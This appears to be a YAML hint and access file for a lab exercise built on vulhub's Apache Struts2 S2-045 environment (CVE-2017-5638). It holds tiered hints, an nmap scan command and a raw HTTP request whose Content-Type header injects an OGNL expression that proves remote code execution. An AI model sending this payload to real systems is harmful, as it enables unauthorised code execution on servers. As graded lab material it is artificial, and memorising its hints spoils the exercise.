schema_version: 1
match: struts2/s2-045
cve: CVE-2017-5638
hint_levels:
  low:
  - Inspect the struts2 service or application on {{NODE_NAME}} @ {{NODE_IP}}.
  medium:
  - |-
    Catalog TCP ports: 8080. Identify the exposed services:

    ```bash
    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
    ```
  - 'Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults;
    use the deployed service port if the scenario remaps it.'
  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
  high:
  - |-
    Vulnerability: S2-045 Remote Code Execution Vulnerablity（CVE-2017-5638）.

    CVE record(s): https://www.cve.org/CVERecord?id=CVE-2017-5638
  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
    substitutions.
  - |-
    Exploitation

    Verify the vulnerability by following request:

    ```
    POST / HTTP/1.1
    Host: {{NODE_IP}}:8080
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: en-US,en;q=0.8,es;q=0.6
    Connection: close
    Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data


    ```

    `233*233` has been successfully executed:

    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-045/1.png
  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-045/README.md'
  - |-
    Additional public references:
    - http://struts.apache.org/docs/s2-045.html
    - https://nsfocusglobal.com/apache-struts2-remote-code-execution-vulnerability-s2-045/
access_instructions:
  title: S2-045 Remote Code Execution Vulnerablity（CVE-2017-5638）
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 8080. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): struts2: 8080/tcp → container 8080/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.

      Documented target URL(s): `http://{{NODE_IP}}:8080`.
  - title: Exploitation
    instructions: |-
      Verify the vulnerability by following request:

      ```
      POST / HTTP/1.1
      Host: {{NODE_IP}}:8080
      Upgrade-Insecure-Requests: 1
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
      Accept-Language: en-US,en;q=0.8,es;q=0.6
      Connection: close
      Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data


      ```

      `233*233` has been successfully executed:

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/struts2/s2-045/1.png
